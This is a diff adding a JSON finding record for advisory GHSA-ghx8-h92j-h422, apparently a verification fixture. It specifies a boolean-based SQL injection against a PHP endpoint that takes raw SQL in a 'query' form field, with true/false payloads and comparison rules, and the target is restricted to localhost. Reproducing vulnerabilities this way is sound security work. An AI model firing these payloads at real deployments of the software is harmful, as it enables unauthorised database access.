@@ -1,0 +1,52 @@
+{
+  "finding_id": "GHSA-ghx8-h92j-h422",
+  "type": "sqli.boolean_based",
+  "target": {
+    "expected_origin": "http://127.0.0.1:8990",
+    "allowed_hosts": [
+      "127.0.0.1"
+    ],
+    "allowed_schemes": [
+      "http"
+    ],
+    "allowed_ports": [
+      8990
+    ]
+  },
+  "auth": {
+    "required": false
+  },
+  "evidence": {
+    "base_request": {
+      "method": "POST",
+      "url": "http://127.0.0.1:8990/html/socio/sistema/controller/query_geracao_auto.php",
+      "headers": [
+        {
+          "name": "content-type",
+          "value": "application/x-www-form-urlencoded"
+        }
+      ],
+      "body": "query=SELECT%201%20AS%20marker"
+    },
+    "injection": {
+      "location": {
+        "kind": "form",
+        "name": "query"
+      },
+      "payloads": {
+        "baseline": "SELECT 1 AS marker",
+        "true_condition": "SELECT 1 AS marker WHERE 1=1",
+        "false_condition": "SELECT 1 AS marker WHERE 1=2"
+      }
+    }
+  },
+  "proof": {
+    "expected_true_similarity_to_baseline": true,
+    "expected_false_difference": true,
+    "compare": [
+      "status",
+      "body_hash_fuzzy"
+    ],
+    "repetitions": 3
+  }
+}
